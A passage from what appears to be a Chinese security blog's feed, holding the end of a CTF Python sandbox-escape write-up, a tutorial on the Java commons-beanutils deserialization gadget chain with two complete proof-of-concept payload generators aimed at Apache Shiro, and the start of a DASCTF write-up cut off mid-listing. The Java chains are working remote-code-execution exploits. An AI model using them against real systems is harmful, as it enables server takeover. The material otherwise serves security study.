src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609174217957.png" alt="image-20240609174217957"></p><h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>由于过滤了<code>__import__</code>，这里要自己找一个能加载模块的类</p><p>最后选择了<code>_frozen_importlib.BuiltinImporter</code>这个可以导入内置模块的查找器，然后加载gc模块，获取所有变量对象即可。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">([].__class__.__base__.__subclasses__()</span></span><span class="hljs-selector-attr">[84]</span><span class="hljs-selector-class">.load_module</span>(<span class="hljs-string">&#x27;gc&#x27;</span>)<span class="hljs-selector-class">.get_objects</span>())<br></code></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609174103845.png" alt="image-20240609174103845"></p><h4 id="法三："><a href="#法三：" class="headerlink" title="法三："></a>法三：</h4><p>晨曦✌的思路：</p><blockquote><p>可以利用指针，把内存的内容读出来，但需要定位一个大致的范围，盲目读取浪费时间</p></blockquote><p>先利用栈帧逃逸到全局，这样就能拿<code>__builtins__</code>和被覆盖后的<code>flag</code>的地址（这里可以参考L3HCTF2024 intractable problem）</p><p>全局<code>flag</code>的地址用<code>id()</code>读出来即可</p><p>接着是利用<code>ctypes</code>模块的指针，用<code>id()</code>将<code>flag</code>地址周围的值读一下，用<code>ctypes.cast</code>实现一个从内存读源码的操作</p><blockquote><p><code>ctypes.cast(obj, type)</code> 此函数类似于 C 的强制转换运算符。 它返回一个 <em>type</em> 的新实例，该实例指向与 <em>obj</em> 相同的内存块。 <em>type</em> 必须为指针类型，而 <em>obj</em> 必须为可以被作为指针来解读的对象。</p></blockquote><p>这里用了 char 指针，读出来的是一个字符串，再加上flag头作为判断，可以很快读出flag</p><p>每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    <span class="hljs-keyword">yield</span> g.gi_frame.f_back.f_back<br><br>g = f()<br>frame = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> g][<span class="hljs-number">0</span>]<br>b = frame.f_back.f_globals<br>flag_id=<span class="hljs-built_in">id</span>(b[<span class="hljs-string">&#x27;flag&#x27;</span>])<br>ctypes = b[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;ctypes&#x27;</span>)<br><span class="hljs-comment">#print(ctypes)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):<br>txt = ctypes.cast((flag_id-<span class="hljs-number">8</span>*i),ctypes.c_char_p).value<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> txt:<br><span class="hljs-built_in">print</span>(txt)<br><span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/image-20240609174155984.png" alt="image-20240609174155984"></p>]]></content>
    
    
    <categories>
      
      <category>WPs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA反序列化——CB链</title>
    <link href="/2024/04/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/"/>
    <url>/2024/04/24/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>jdk：jdk8u65</p><p>CB：commons-beanutils 1.8.3</p><p>在pom.xml里添加</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="CommonsBeanutils利用点"><a href="#CommonsBeanutils利用点" class="headerlink" title="CommonsBeanutils利用点"></a>CommonsBeanutils利用点</h1><p>commons-beanutils中提供了一个静态方法<code>PropertyUtils.getProperty()</code>，可以让使用者直接调用任意JavaBean的getter方法</p><p><code>PropertyUtils.getProperty()</code>传入两个参数，第一个参数为 JavaBean 实例，第二个是 JavaBean 的属性</p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Mike&quot;</span>);<br>PropertyUtils.getProperty(person,<span class="hljs-string">&quot;name&quot;</span>);<br># 等价于<br><span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Mike&quot;</span>);<br>person.getName();<br></code></pre></td></tr></table></figure><p>除此之外， <code>PropertyUtils.getProperty</code> 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过 PropertyUtils.getProperty(a, “b.c”); 的方式进行递归获取。通过这个方法，使用者可以很方便地调用任意对象的getter。</p><p>因此，如果getter方法存在可以rce的点可以利用的话，就存在安全问题了。</p><p>commons-beanutils里还有很多其他的辅助方法，setter等等，这里分析CB链暂时用不到。</p><h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>在前面的<a href="https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC3%E9%93%BE/">CC3链</a>中，我们提到过一种利用 TemplatesImpl 动态加载恶意类来实现rce</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">TemplatesImpl</span>：<br><span class="hljs-function"><span class="hljs-title">getOutputProperties</span>()</span><br>    -&gt;<span class="hljs-function"><span class="hljs-title">newTransformer</span>()</span><br>        -&gt;<span class="hljs-function"><span class="hljs-title">getTransletInstance</span>()</span><br>            -&gt;<span class="hljs-function"><span class="hljs-title">defineTransletClasses</span>()</span><br>                <span class="hljs-variable">TransletClassLoader</span>:<br>                -&gt;<span class="hljs-function"><span class="hljs-title">defineClass</span>()</span><br></code></pre></td></tr></table></figure><hr><p>在之前的CC2&#x2F;4的链中我们用到了<code>java.util.PriorityQueue</code>的readObject触发反序列化，主要是通过调用了其<code>TransformingComparator</code>的compare方法，进而调用了transform链的调用。</p><p>而 CommonsBeanutils 利用链中核心的触发位置就是 <code>BeanComparator.compare()</code> 函数，当调用<code>BeanComparator.compare()</code> 方法时，其内部会调用我们前面说的 <code>getProperty</code> 函数，进而调用JavaBean中对应属性的 getter 函数。</p><p>我们看看BeanComparator.compare()方法：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/image-20240424124417697.png" alt="image-20240424124417697"></p><p>这里会调用<code>PropertyUtils.getProperty()</code>方法 。</p><p>这个方法传入两个对象，如果<code>this.property</code>为空，则直接比较这两个对象；如果<code>this.property</code>不为空，则用<code>PropertyUtils.getProperty</code>分别取这两个对象的<code>this.property</code>属性，比较属性的值。因此通过给 o1赋值构造好的templates对象，property赋值为TemplatesImpl的 outputProperties属性，即可调用<code>TemplatesImpl.getOutputProperties()</code> 往下就是TemplatesImpl的利用链。</p><p>那么往上找，哪里调用 compare()呢？</p><p>可以利用CC2&#x2F;4链中的 <code>PriorityQueue.readObject()</code></p><hr><p>前面的<a href="https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2%E9%93%BE/">CC2链</a>文章提到了，queue的size应该大于等于2，而add()也会执行compare，由于在BeanComparator的compare()方法中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对1、2进行排序。所以在初始化的时候，我们add任意值，然后利用反射修改成恶意TemplateImpl 对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, Beancomparator);<br>queue.add(<span class="hljs-number">1</span>);<br>queue.add(<span class="hljs-number">2</span>);<br><br>setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<span class="hljs-comment">// 设置BeanComparator.compare()的参数,修改成恶意TemplateImpl 对象</span><br>setFieldValue(comparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);  <span class="hljs-comment">//property赋值为TemplatesImpl的 outputProperties属性来调用后面的TemplatesImpl的利用链。</span><br></code></pre></td></tr></table></figure><p>然后结合一下CC3的TemplatesImpl的利用链。</p><p>所以整条CB链子的流程是这样的：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs livescript">PriorityQueue.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">    -&gt;</span>BeanComparator.compare<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">        -&gt;</span>PropertyUtils.getProperty()<br>TemplatesImpl类：<br>            -&gt;getOutputProperties<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>newTransformer<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                    -&gt;</span>getTransletInstance<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                        -&gt;</span>defineTransletClasses()<br>TransletClassLoader类：<br>                                -&gt;defineClass()<br></code></pre></td></tr></table></figure><h2 id="完整CB链-with-CC依赖"><a href="#完整CB链-with-CC依赖" class="headerlink" title="完整CB链(with CC依赖)"></a>完整CB链(with CC依赖)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB_with_CC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//CC3</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <br><span class="hljs-comment">//CB</span><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">Beancomparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <br>        <span class="hljs-comment">//CC2</span><br>        PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, Beancomparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(Beancomparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);  <span class="hljs-comment">//property赋值为TemplatesImpl的outputProperties属性</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<span class="hljs-comment">// 设置BeanComparator.compare()的参数,修改成恶意TemplateImpl 对象</span><br><br>        serialize(queue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;   <span class="hljs-comment">//反射修改属性值</span><br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>如果直接使用上面的链子打Shiro550会报错：没找到<code>org.apache.commons.collections.comparators.ComparableComparator</code>类</p><p>从包名即可看出，这个类是来自于<code>commons-collections</code>，commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽 然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于  commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p><p>那么有没有不需要依赖commons-collections的CB链呢？</p><p>答案是有的。</p><h1 id="无CC依赖的Shiro反序列化利用链"><a href="#无CC依赖的Shiro反序列化利用链" class="headerlink" title="无CC依赖的Shiro反序列化利用链"></a>无CC依赖的Shiro反序列化利用链</h1><p>看看<code>org.apache.commons.collections.comparators.ComparableComparator</code>这个类在哪里使用了：</p><p><img src="/img/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CB%E9%93%BE/3010963-20221114181650982-311705810.png" alt="3010963-20221114181650982-311705810"></p><p>在<code>BeanComparator</code>类的构造函数处，当没有显式传入<code>Comparator</code>的情况下，则默认使用 <code>ComparableComparator</code> 。</p><p>既然此时没有ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p><ul><li><p>实现 java.util.Comparator接口</p></li><li><p>实现java.io.Serializable接口</p></li><li><p>Java、shiro或commons-beanutils自带</p></li></ul><p>对于commons-beanutils中，只有BeanComparator这一个类满足，我们查找一下JDK中的类。</p><p>存在很多很多，常用的为<code>java.util.Collections$ReverseComparator</code>或者<code>java.lang.String$CaseInsensitiveComparator</code></p><p>我们只需要利用反射，将对应的comparator写入属性中，就不需要依赖CC库了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//下面这两个二选一都可以</span><br>setFieldValue(beanComparator, <span class="hljs-string">&quot;comparator&quot;</span>, String.CASE_INSENSITIVE_ORDER);<br>setFieldValue(beanComparator, <span class="hljs-string">&quot;comparator&quot;</span>, Collections.reverseOrder());<br></code></pre></td></tr></table></figure><h2 id="完整CB链-without-CC依赖"><a href="#完整CB链-without-CC依赖" class="headerlink" title="完整CB链(without CC依赖)"></a>完整CB链(without CC依赖)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB_no_CC</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/home/yinyun/Documents/JavaLearing/CC/target/classes/runtime.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, codes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">Beancomparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, Beancomparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br><br>        setFieldValue(Beancomparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);  <span class="hljs-comment">//property赋值为TemplatesImpl的outputProperties属性</span><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<span class="hljs-comment">// 设置BeanComparator.compare()的参数,修改成恶意TemplateImpl 对象</span><br>        setFieldValue(Beancomparator, <span class="hljs-string">&quot;comparator&quot;</span>, String.CASE_INSENSITIVE_ORDER);<br>        serialize(queue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object object,String field_name,Object filed_value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;   <span class="hljs-comment">//反射修改属性值</span><br>        Class clazz=object.getClass();<br>        Field declaredField=clazz.getDeclaredField(field_name);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(object,filed_value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;serialize&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.cnblogs.com/1vxyz/p/17588722.html">Java反序列化Commons-Beanutils篇-CB链</a></p><p><a href="https://www.cnblogs.com/gk0d/p/16889963.html">CB利用链及无依赖打Shiro</a></p><p><a href="https://www.freebuf.com/articles/web/345332.html">commons-beanutils的三种利用原理构造与POC</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2024校赛</title>
    <link href="/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/"/>
    <url>/2024/04/20/DASCTF2024%E6%A0%A1%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h1><p>server.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 